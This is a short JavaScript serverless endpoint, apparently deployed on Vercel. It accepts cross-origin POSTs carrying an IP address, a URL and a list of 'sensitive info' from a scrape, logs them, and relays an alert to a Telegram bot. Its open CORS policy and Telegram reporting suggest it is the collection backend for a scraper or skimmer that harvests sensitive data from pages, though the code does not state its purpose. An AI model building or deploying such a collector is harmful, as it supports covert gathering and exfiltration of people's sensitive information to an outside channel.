export default async function handler(req, res) {
    // 1. Correct CORS Headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight request
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const data = req.body;
        
        console.log('--- New Scrape Request ---');
        console.log('IP:', data?.ip || 'N/A');
        console.log('URL:', data?.url || 'N/A');
        console.log('Sensitive Info Count:', data?.sensitiveInfo?.length || 0);

        // 2. Send to Telegram safely (won't break the API if it fails)
        await sendToTelegram(data);

        // 3. Return success immediately
        return res.status(200).json({ 
            success: true, 
            message: 'Data received',
            itemsFound: data?.sensitiveInfo?.length || 0
        });

    } catch (error) {
        console.error('API Error:', error);
        return res.status(500).json({ error: 'Internal Server Error', details: error.message });
    }
}

// Helper function example for Telegram
async function sendToTelegram(data) {
    // 3. Use process.env correctly. If these are not set in Vercel Dashboard, it will skip.
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // If tokens are missing, just log and return (don't throw error)
    if (!token || !chatId) {
        console.log('Telegram credentials missing. Skipping send.');
        return;
    }

    const message = `
🚨 *New Scrape Alert*
IP: ${data?.ip || 'N/A'}
URL: ${data?.url || 'N/A'}
Sensitive Items: ${data?.sensitiveInfo?.length || 0}
`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            console.error('Telegram API Error:', response.statusText);
        }
    } catch (e) {
        console.error('Failed to send Telegram message:', e);
    }
}
